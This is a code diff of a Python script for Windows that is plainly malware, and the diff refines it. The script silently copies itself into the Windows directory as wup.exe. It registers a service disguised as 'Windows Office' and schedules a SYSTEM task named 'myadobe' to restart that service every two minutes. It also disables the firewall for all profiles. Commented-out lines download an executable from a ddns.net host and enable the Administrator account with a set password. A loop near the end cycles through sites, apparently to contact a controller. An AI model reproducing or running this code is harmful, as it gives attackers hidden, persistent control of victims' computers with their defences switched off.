@@ -87,7 +87,7 @@ try:
     CREATE_NO_WINDOW = 0x08000000
     swin=os.getenv('windir')
     suser=os.getenv('USERPROFILE')
-    #if not os.path.exists('c:\\windows\\wup.exe'):
+    if not os.path.exists('c:\\windows\\wup.exe'):
         
 ##    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
 ##    with open(swin+'\\wup.exe',"wb") as code:
@@ -102,13 +102,13 @@ try:
     #time.sleep(1)
     #subprocess.call("cmd /c del "+swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
     #time.sleep(1)
-    subprocess.call("cmd /c copy /y "+sys.argv[0]+" " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
-    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
-    #print("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest")
-    subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F", creationflags=CREATE_NO_WINDOW)
-    subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
-    subprocess.call("net start wup", creationflags=0x08000000)
-    os.system("netsh advfirewall set allprofiles state off")
+        subprocess.call("cmd /c copy /y "+sys.argv[0]+" " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
+        #print("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest")
+        subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("net start wup", creationflags=0x08000000)
+        os.system("netsh advfirewall set allprofiles state off")
     #os.system("net.exe user Administrator /active:yes")
     #os.system("net.exe user Administrator Qwerty12")
     #myloop()
@@ -350,5 +350,5 @@ def myloop():
                     site=site3
                 elif site == site3:
                     site=site1
-        time.sleep(7)
+        time.sleep(10)
 
